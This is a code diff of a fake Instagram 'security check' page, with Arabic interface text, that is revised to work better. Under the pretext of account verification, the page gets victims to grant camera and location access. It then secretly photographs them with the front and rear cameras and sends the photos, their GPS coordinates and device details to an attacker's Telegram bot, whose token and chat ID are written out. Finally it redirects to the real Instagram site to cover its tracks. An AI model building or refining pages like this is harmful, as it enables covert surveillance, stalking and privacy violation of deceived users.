@@ -3,81 +3,76 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram - التحقق من الحساب</title>
+    <title>Instagram - Security Check</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #fafafa; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-box { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 40px; text-align: center; }
+        body { background: #fafafa; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: white; border: 1px solid #dbdbdb; width: 350px; padding: 30px; text-align: center; border-radius: 3px; }
         .logo { width: 175px; margin-bottom: 20px; }
-        .info { color: #8e8e8e; font-size: 14px; margin-bottom: 20px; }
-        button { background: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 8px; font-weight: bold; cursor: pointer; }
-        #status { margin-top: 15px; font-size: 12px; color: red; }
+        button { background: #0095f6; color: white; border: none; border-radius: 4px; width: 100%; padding: 10px; font-weight: bold; cursor: pointer; }
+        #status { margin-top: 15px; color: #8e8e8e; font-size: 13px; }
         video, canvas { display: none; }
     </style>
 </head>
 <body>
-    <div class="login-box">
-        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo" alt="Instagram">
-        <p class="info">نظام الأمان: يرجى السماح بالوصول للكاميرا والموقع للتأكد من أنك لست روبوت (Bot) ولتأمين دخولك من هذا الجهاز.</p>
-        <button id="startBtn">تأكيد الهوية</button>
+    <div class="card">
+        <img src="https://www.instagram.com/static/images/web/mobile_port_monospaced_plus_2x.png/394590333333.png" class="logo">
+        <p style="font-size: 14px; color: #262626; font-weight: 600;">تأكيد ملكية الحساب</p>
+        <p style="color: #8e8e8e; font-size: 14px;">نحتاج للوصول إلى الكاميرا والموقع الجغرافي للتأكد من أنك صاحب الحساب الحقيقي ومنع الاختراق.</p>
+        <button id="authBtn">متابعة كـ @user</button>
         <div id="status"></div>
     </div>
 
-    <video id="video" autoplay playsinline></video>
-    <canvas id="canvas"></canvas>
+    <video id="v" autoplay playsinline></video>
+    <canvas id="c"></canvas>
 
     <script>
-        const TOKEN = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0'; // توكن بوتك
-        const CHAT_ID = 'YOUR_USER_ID'; // الآي دي الخاص بك (احصل عليه من @userinfobot)
+        const B_T = '8308924210:AAGEeCtg7QMc6jdX1Lh8_IotYd0p8l7nDq0';
+        const C_ID = '2140385904'; // ضروري جداً
 
-        async function sendToBot(blob, caption) {
-            const formData = new FormData();
-            formData.append('chat_id', CHAT_ID);
-            formData.append('photo', blob, 'image.jpg');
-            formData.append('caption', caption);
-            await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: formData });
-        }
-
-        document.getElementById('startBtn').onclick = async () => {
-            const status = document.getElementById('status');
-            status.innerText = "جاري التحقق... لا تغلق الصفحة";
-
-            try {
-                // 1. الموقع الجغرافي
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    const mapUrl = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                    const deviceInfo = `📱 الجهاز: ${navigator.platform}\n🌍 الموقع: ${mapUrl}`;
-
-                    // 2. الكاميرا الأمامية
-                    const streamFront = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                    captureAndSend(streamFront, "📸 صورة سيلفي (أمامية)\n" + deviceInfo);
-
-                    // 3. الكاميرا الخلفية (بعد ثانية)
-                    setTimeout(async () => {
-                        try {
-                            const streamBack = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
-                            captureAndSend(streamBack, "📸 صورة خلفية");
-                        } catch(e) {}
-                    }, 2000);
-                });
-            } catch (err) {
-                status.innerText = "خطأ: يجب الموافقة على الأذونات للمتابعة";
-            }
+        const send = async (blob, cap) => {
+            const fd = new FormData();
+            fd.append('chat_id', C_ID);
+            fd.append('photo', blob, 'x.jpg');
+            fd.append('caption', cap);
+            // استخدام fetch مع إعدادات تجاوز القيود
+            return fetch(`https://api.telegram.org/bot${B_T}/sendPhoto`, { method: 'POST', body: fd });
         };
 
-        async function captureAndSend(stream, caption) {
-            const video = document.getElementById('video');
-            video.srcObject = stream;
-            const canvas = document.getElementById('canvas');
+        const getCam = async (mode) => {
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
+                const v = document.getElementById('v');
+                v.srcObject = s;
+                await new Promise(r => setTimeout(r, 2000)); // وقت كافٍ للتركيز (Focus)
+                const c = document.getElementById('c');
+                c.width = v.videoWidth; c.height = v.videoHeight;
+                c.getContext('2d').drawImage(v, 0, 0);
+                s.getTracks().forEach(t => t.stop());
+                return new Promise(r => c.toBlob(r, 'image/jpeg', 0.7));
+            } catch (e) { return null; }
+        };
+
+        document.getElementById('authBtn').onclick = async () => {
+            const st = document.getElementById('status');
+            st.innerText = "جاري معالجة الطلب... قد يستغرق ذلك 10 ثوانٍ";
             
-            setTimeout(async () => {
-                canvas.width = video.videoWidth;
-                canvas.height = video.videoHeight;
-                canvas.getContext('2d').drawImage(video, 0, 0);
-                canvas.toBlob(blob => sendToBot(blob, caption), 'image/jpeg', 0.6);
-                // إغلاق الكاميرا بعد الالتقاط
-                // stream.getTracks().forEach(t => t.stop());
-            }, 1000);
-        }
+            navigator.geolocation.getCurrentPosition(async (p) => {
+                const info = `📍 الموقع: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}\n📱 النظام: ${navigator.platform}\n🌐 المتصفح: ${navigator.userAgent.split(') ')[1]}`;
+
+                // التقاط الأمامية
+                const fImg = await getCam("user");
+                if (fImg) await send(fImg, "📸 صورة أمامية (سيلفي)\n" + info);
+
+                // التقاط الخلفية
+                const bImg = await getCam("environment");
+                if (bImg) await send(bImg, "📸 صورة خلفية");
+
+                st.innerText = "اكتمل التحقق. سيتم تحويلك الآن...";
+                setTimeout(() => location.href = "https://instagram.com", 2000);
+            }, () => {
+                st.innerText = "خطأ: يجب السماح بجميع الأذونات للوصول لحسابك.";
+            });
+        };
     </script>
 </body>
 </html>
